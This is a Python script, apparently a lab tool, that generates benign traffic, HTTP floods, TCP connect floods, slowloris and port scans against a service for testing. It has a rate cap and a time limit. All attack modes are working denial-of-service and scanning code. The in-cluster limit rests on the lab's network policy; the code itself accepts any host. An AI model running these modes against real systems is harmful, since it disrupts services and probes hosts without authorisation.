"""Rate-capped, in-cluster-only traffic/attack generator for the lab (Phase 5).

SAFETY: targets ONLY the host:port given on the command line (always an
in-cluster service), is always rate-capped (--rate), runs for a bounded --secs,
and performs no spoofing, persistence, stealth or destructive action. It runs in
the isolated `generators` namespace behind default-deny egress, so it physically
cannot reach anything outside the cluster.

Modes:
  benign    normal browsing-like GETs across several paths (for warmup/peak)
  httpflood many repeated GETs to one path (application-layer flood)
  synflood  rapid TCP connect+close storm (SYNs; no raw sockets, no spoofing)
  slowloris many connections sending headers very slowly (resource exhaustion)
  scan      connect attempts across a port range (distributed scan)
"""
from __future__ import annotations
import argparse, random, socket, sys, threading, time
import urllib.request

def _rate_sleep(rate, n, t0):
    if rate <= 0: return
    target = t0 + n / rate
    d = target - time.time()
    if d > 0: time.sleep(d)

def benign(host, port, secs, rate):
    paths = ["/", "/product/OLJCESPC7Z", "/product/66VCHSJNUP", "/cart", "/product/0PUK6V6EV0"]
    end = time.time() + secs; n = 0; t0 = time.time()
    while time.time() < end:
        try:
            urllib.request.urlopen(f"http://{host}:{port}{random.choice(paths)}", timeout=3).read(64)
        except Exception: pass
        n += 1; _rate_sleep(rate, n, t0)

def httpflood(host, port, secs, rate, path="/"):
    end = time.time() + secs; n = 0; t0 = time.time()
    while time.time() < end:
        try: urllib.request.urlopen(f"http://{host}:{port}{path}", timeout=2).read(16)
        except Exception: pass
        n += 1; _rate_sleep(rate, n, t0)

def synflood(host, port, secs, rate):
    end = time.time() + secs; n = 0; t0 = time.time()
    while time.time() < end:
        s = socket.socket(); s.settimeout(1)
        try:
            s.connect((host, port)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
        except Exception: pass
        finally: s.close()
        n += 1; _rate_sleep(rate, n, t0)

def slowloris(host, port, secs, rate, n_sock=30):
    socks = []
    for _ in range(n_sock):
        try:
            s = socket.socket(); s.settimeout(3); s.connect((host, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            socks.append(s)
        except Exception: pass
    end = time.time() + secs
    while time.time() < end:
        for s in list(socks):
            try: s.send(f"X-a: {random.randint(0,9999)}\r\n".encode())
            except Exception:
                socks.remove(s)
        time.sleep(max(1.0, 1.0 / max(rate, 0.1)))
    for s in socks:
        try: s.close()
        except Exception: pass

def scan(host, port, secs, rate, lo=1, hi=1024):
    end = time.time() + secs; n = 0; t0 = time.time()
    while time.time() < end:
        p = random.randint(lo, hi); s = socket.socket(); s.settimeout(0.5)
        try: s.connect_ex((host, p))
        except Exception: pass
        finally: s.close()
        n += 1; _rate_sleep(rate, n, t0)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", required=True, choices=["benign","httpflood","synflood","slowloris","scan"])
    ap.add_argument("--host", required=True); ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--secs", type=float, default=60); ap.add_argument("--rate", type=float, default=20,
                    help="per-pod cap: requests/connections per second (0 = as fast as possible, DO NOT use)")
    ap.add_argument("--path", default="/")
    a = ap.parse_args()
    if a.rate <= 0: print("refusing rate<=0 (uncapped)"); sys.exit(2)
    print(f"[attacker] mode={a.mode} target={a.host}:{a.port} secs={a.secs} rate={a.rate}/s", flush=True)
    fn = {"benign": benign, "httpflood": httpflood, "synflood": synflood, "slowloris": slowloris, "scan": scan}[a.mode]
    if a.mode == "httpflood": fn(a.host, a.port, a.secs, a.rate, a.path)
    else: fn(a.host, a.port, a.secs, a.rate)
    print("[attacker] done", flush=True)

if __name__ == "__main__":
    main()
